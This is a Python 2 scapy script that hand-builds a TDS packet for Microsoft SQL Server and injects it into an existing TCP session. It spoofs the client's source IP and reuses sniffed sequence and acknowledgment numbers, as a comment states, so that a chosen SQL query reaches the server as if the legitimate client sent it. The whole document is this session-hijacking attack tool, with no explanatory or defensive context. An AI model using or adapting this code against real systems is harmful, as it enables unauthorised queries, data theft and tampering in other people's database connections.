from scapy.all import *

srcip="192.168.37.1"
dstip="192.168.37.135"
dstport=1433 #default sqlserver port

#must be dynamically generated via sniffing
srcport=59275
seqnum=703947055
acknum=1177937577

class TDSPacket:
	type="01"
	status="09"
	length="007e" #derived from length of query: 30+len(query)*2
	channel="0000"
	pktnum="01"
	window="00"
	totalhlength="16000000"
	hlength="12000000"
	htype="0200"
	typevalue="0000000000000000"
	outstandingreqs="01000000"
	query=""
	data=""

	def __init__(self,query):
		for x in query:
			self.query+=x.encode("hex")+"00"
		#self.length=str((len(query)*2+30)).encode("hex")
		self.data=self.type+self.status+self.length+self.channel+self.pktnum+self.window+self.totalhlength+self.hlength+self.htype+self.typevalue+self.outstandingreqs+self.query	

def main():
	global dstip,srcip,dstport,srcport,seqnum,acknum
	tdsdata=TDSPacket("Select * from users where username = 'swarmuser'")
	send(IP(dst=dstip,src=srcip)/TCP(flags="PA",dport=dstport,sport=srcport,seq=seqnum,ack=acknum)/tdsdata.data.decode("hex"))

if __name__ == "__main__":
	main()
